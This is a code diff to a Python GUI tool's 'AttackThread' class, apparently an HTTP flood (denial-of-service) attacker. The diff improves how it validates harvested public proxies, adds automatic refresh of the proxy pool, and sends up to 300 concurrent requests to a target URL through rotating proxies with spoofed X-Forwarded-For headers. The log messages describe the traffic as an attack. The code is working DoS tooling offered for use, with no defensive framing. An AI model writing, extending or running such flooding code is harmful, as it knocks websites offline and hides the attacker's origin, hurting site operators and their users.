@@ -76,6 +76,7 @@ class AttackThread(QThread):
         self.is_running = True
         self.success_count = {"socks4": 0, "socks5": 0, "https": 0}
         self.failure_count = {"socks4": 0, "socks5": 0, "https": 0}
+        self.working_proxies = []
 
     async def fetch_proxies(self, url):
         async with aiohttp.ClientSession() as session:
@@ -105,23 +106,23 @@ class AttackThread(QThread):
         return all_proxies
 
     async def test_proxy(self, session, proxy, protocol, retries=3):
+        test_urls = ['http://icanhazip.com', 'http://api.ipify.org']
         for attempt in range(retries):
-            try:
-                ip, port = proxy.split(':')
-                proxy_url = f"{protocol}://{ip}:{port}"
-                if protocol in ["socks4", "socks5"]:
-                    connector = ProxyConnector.from_url(proxy_url)
-                    async with aiohttp.ClientSession(connector=connector) as temp_session:
-                        async with temp_session.get('http://icanhazip.com', timeout=10) as response:
+            for test_url in test_urls:
+                try:
+                    ip, port = proxy.split(':')
+                    proxy_url = f"{protocol}://{ip}:{port}"
+                    if protocol in ["socks4", "socks5"]:
+                        async with session.get(test_url, proxy=proxy_url, timeout=12, ssl=False) as response:
                             if response.status == 200:
                                 return (proxy, protocol)
-                else:  # https
-                    async with session.get('http://icanhazip.com', proxy=proxy_url, timeout=10) as response:
-                        if response.status == 200:
-                            return (proxy, protocol)
-            except Exception as e:
-                self.log_signal.emit(f"Proxy test failed for {proxy} ({protocol}, attempt {attempt+1}/{retries}): {str(e)}")
-            await asyncio.sleep(1)
+                    else:  # https
+                        async with session.get(test_url, proxy=proxy_url, timeout=12, ssl=False) as response:
+                            if response.status == 200:
+                                return (proxy, protocol)
+                except Exception as e:
+                    self.log_signal.emit(f"Proxy test failed for {proxy} ({protocol}, attempt {attempt+1}/{retries}, url {test_url}): {str(e)}")
+                await asyncio.sleep(1)
         return None
 
     async def get_working_proxies(self):
@@ -132,8 +133,15 @@ class AttackThread(QThread):
             tasks = [self.test_proxy(session, proxy, protocol) for proxy, protocol in all_proxies]
             results = await asyncio.gather(*tasks)
             working_proxies = [p for p in results if p is not None]
+            self.working_proxies = working_proxies
             self.log_signal.emit(f"Validated {len(working_proxies)} working proxies (SOCKS4: {sum(1 for _, p in working_proxies if p == 'socks4')}, SOCKS5: {sum(1 for _, p in working_proxies if p == 'socks5')}, HTTPS: {sum(1 for _, p in working_proxies if p == 'https')})")
             return working_proxies
+
+    async def refresh_proxies(self):
+        self.log_signal.emit("Refreshing proxy pool due to low working proxies...")
+        self.working_proxies = await self.get_working_proxies()
+        if not self.working_proxies:
+            self.log_signal.emit("No new working proxies found during refresh. Continuing with existing pool.")
 
     async def send_request(self, session, proxy, protocol, semaphore):
         if not self.is_running:
@@ -148,22 +156,13 @@ class AttackThread(QThread):
                 "Connection": "keep-alive",
                 "X-Forwarded-For": ip,
             }
-            for attempt in range(3):  # Retry up to 3 times
+            for attempt in range(3):
                 try:
-                    if protocol in ["socks4", "socks5"]:
-                        connector = ProxyConnector.from_url(proxy_url)
-                        async with aiohttp.ClientSession(connector=connector) as temp_session:
-                            async with temp_session.get(self.target_url, headers=headers, timeout=12) as response:
-                                status = response.status
-                                self.log_signal.emit(f"Attack on {self.target_url} via {proxy} ({protocol}) - Status: {status}")
-                                self.success_count[protocol] += 1
-                                return
-                    else:  # https
-                        async with session.get(self.target_url, headers=headers, proxy=proxy_url, timeout=12) as response:
-                            status = response.status
-                            self.log_signal.emit(f"Attack on {self.target_url} via {proxy} ({protocol}) - Status: {status}")
-                            self.success_count[protocol] += 1
-                            return
+                    async with session.get(self.target_url, headers=headers, proxy=proxy_url, timeout=15, ssl=False) as response:
+                        status = response.status
+                        self.log_signal.emit(f"Attack on {self.target_url} via {proxy} ({protocol}) - Status: {status}")
+                        self.success_count[protocol] += 1
+                        return
                 except Exception as e:
                     self.log_signal.emit(f"Error sending request via {proxy} ({protocol}, attempt {attempt+1}/3): {str(e)}")
                     await asyncio.sleep(1)
@@ -174,13 +173,18 @@ class AttackThread(QThread):
         if not working_proxies:
             self.log_signal.emit("No working proxies found. Aborting attack.")
             return
+        if len(working_proxies) < 10:
+            self.log_signal.emit(f"Warning: Only {len(working_proxies)} proxies validated. Attack may be less effective.")
         proxy_cycle = itertools.cycle(working_proxies)
-        semaphore = asyncio.Semaphore(300)  # Increased concurrency
+        semaphore = asyncio.Semaphore(300)
         async with aiohttp.ClientSession() as session:
             tasks = []
             for i in range(self.num_requests):
                 if not self.is_running:
                     break
+                if len(self.working_proxies) < 5:  # Refresh if proxy pool is low
+                    await self.refresh_proxies()
+                    proxy_cycle = itertools.cycle(self.working_proxies)
                 proxy, protocol = next(proxy_cycle)
                 tasks.append(self.send_request(session, proxy, protocol, semaphore))
                 if len(tasks) >= 300:
